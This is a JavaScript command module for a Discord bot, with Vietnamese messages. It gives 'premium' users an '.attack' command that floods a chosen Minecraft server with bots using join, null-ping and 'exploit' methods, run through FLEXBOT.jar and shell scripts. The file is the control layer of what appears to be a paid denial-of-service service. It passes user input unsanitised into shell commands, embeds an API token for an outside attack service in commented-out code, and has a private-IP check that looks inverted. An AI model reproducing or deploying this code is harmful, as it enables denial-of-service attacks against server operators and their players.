const Discord = require("discord.js");
const shell = require('shelljs');
const http = require('http');
const XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;

exports.run = async (client, message, args) => {
const host = message.content.split (" ")[1]
const ip = host?.split(":")[0]
const ports = host?.split(":")[1]
const protocol = message.content.split (" ")[2]
const methods = message.content.split (" ")[3]
const time = message.content.split (" ")[4]
const config = require('../config.json');
var primary_room = config.commandroom;
var secondary_room = config.secondary_commandroom;
var version = config.versionbot;
var img = config.img;
var photo = config.photo;
var rolebasic = config.rolebasic;
const test = (methods || '').toLowerCase();
const port = (ports || '25565');
const times = (time || '60');
var idrole = config.premium;
var idrole1 = config.advanced;
let role = message.member.roles.cache.has(idrole);
let role1 = message.member.roles.cache.has(idrole1);


// var url = "https://api.mcstorm.net/start_attack";

// var xhr = new XMLHttpRequest();
// xhr.open("POST", url);

// xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

// xhr.onreadystatechange = function () {
   // if (xhr.readyState === 4) {
      // console.log(xhr.status);
      // console.log(xhr.responseText);
   // }};

if (message.channel.id != primary_room && message.channel.id != secondary_room) {
	return;
  }

if(!args[0]) {
	message.reply("MẪU LỆNH TẤN CÔNG `.attack lenni0451.net:25565 47 random`");
	return;
}

if(!/\blocalhost.|\b127.0.[0-9]|\b192.168.[0-9]|\b172.16.[0-9]/g.test(host)) {
	message.reply("Tính làm gì đấy chú em 😂");
	return;
}

if(!args[1]) {
	message.reply("Vui lòng thêm PHIÊN BẢN BOT!");
	return;
}

if(!/^[0-9]/.test(protocol)) {
	message.reply("Bạn phải sử dụng 1 con số!");
	return;
}

if(!args[2]) {
	message.reply("Bạn cần thêm PHƯƠNG PHÁP TẤN CÔNG!");
	return;
}

if(!/\b((120)|[1-9]\d?)\b/.test(times)) {
	message.reply("Thời gian giới hạn từ 1-120 giây!");
	return;
}

if (role || message.member.permissions.has("ADMINISTRATOR")) {
	if (test === "join" || test === "joinmotd" || test === "random" || test === "nullping" || test === "exploit") {
		if (Math.floor(new Date().getTime() / 1000) - attack_1 < times && Math.floor(new Date().getTime() / 1000) - attack_2 < times) {
			message.channel.send('**You can\'t start an ATTACK right now!**\n\n`2/2 ATTACKS` are in progress! Try again when are less than 2 attacks running!')
			return;
		}	
		var chetmemay = test.replace("join", "join")
			   .replace("joinmotd", "multikiller")
			   .replace("nullping", "nullping")
			   .replace("random", "random")
			   .replace("exploit", "exploit")
			   
		  var miniflex = test.replace("join", "JOIN")
			   .replace("joinmotd", "JOIN MOTD")
			   .replace("nullping", "NullPing")
			   .replace("random", "RANDOM")
			   .replace("exploit", "EXPLOIT")
			   
			   const embed = new Discord.MessageEmbed()
					.setColor('#2ECC71')
					.setTitle("MCBOT V1.0")
					.setDescription("```Máy chủ: " + host + " \nPhiên bản: " + protocol + " \nPhương pháp: " + miniflex + " \nBot: Unlimited \nThời Gian: " + times + "s```")
					.setImage("https://mcapi.us/server/image?ip=" + ip + "&port=" + port + "&theme=dark&title=MCBOT")
			   
			   const embed1 = new Discord.MessageEmbed()
					.setColor('#f69513')
					.setTitle(":cloud_lightning: ATTACK STARTED!")
					.addFields(
					{ name: ':ghost: Bot Name', value: 'MCBOT', inline: true },
					{ name: ':link: Server', value: host, inline: true },
					{ name: ':lock: Version', value: protocol, inline: true },
					{ name: ':boom: Method', value: miniflex, inline: true },
					{ name: ':rocket: Bot', value: 'Unlimited', inline: true },
					{ name: ':alarm_clock: Duration', value: '60s', inline: true },
					)
					.setFooter({
						text: `It can take up to 5 seconds to start this attack!`,
						iconURL: img
					})
					.setImage("https://mcapi.us/server/image?ip=" + ip + "&port=" + port + "&theme=dark&title=MCBOT")
				
				var exec = require('child_process').exec
					exec(`java -Dperdelay=5000 -Ddelay=3 -Drmnwp=false -jar FLEXBOT.jar ${host} ${protocol} ${chetmemay} ${times} -1 MCBOT`, (error, stdout, stderr) => {
				});
				
				shell.exec(`cd /root/MCATTACK/machines && screen -dmS minecraft_server timeout 10 ./dedv1.sh start java ${host} ${protocol} ${chetmemay} ${times} -1 MCBOT`)
				shell.exec(`cd /root/MCATTACK/machines && screen -dmS minecraft_server timeout 10 ./dedv2.sh start java ${host} ${protocol} ${chetmemay} ${times} -1 MCBOT`)
				shell.exec(`cd /root/MCATTACK/machines && screen -dmS minecraft_server timeout 10 ./dedv3.sh start java ${host} ${protocol} ${chetmemay} ${times} -1 MCBOT`)
				
				// var data = "token=15L4YHUR9ANB9AQQAL98OPVZLTZSDK831RD4BLLUJ0NVTLKGFV0FQZLYTELZF967&ipport=" + host + "&protocol=" + protocol + "&time=60&method=ping&network=2&concurrent=1";
				
				// xhr.send(data);
				
				message.channel.send({embeds : [embed]});

				if (Math.floor(new Date().getTime() / 1000) - attack_1 > times) attack_1 = Math.floor(new Date().getTime() / 1000);
				else if (Math.floor(new Date().getTime() / 1000) - attack_2 > times) attack_2 = Math.floor(new Date().getTime() / 1000);
				return;
	} else {
		message.reply(test + " doesn't exist");
		return;
	}
} else {
	message.reply("You need premium plan to use!");
	return;
}
}

function validateTextNumericInRange (textInputId) {
    var textInput = document.getElementById(textInputId);
    var value = parseInt(textInput.value, 10);

    return (!isNaN(value) && value >= 1 && value <= 120);
}

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['attack'],
  permLevel: 0
}

exports.help = {
  name: 'attack',
  description: 'Lệnh Tấn Công',
  usage: 'attack'
}
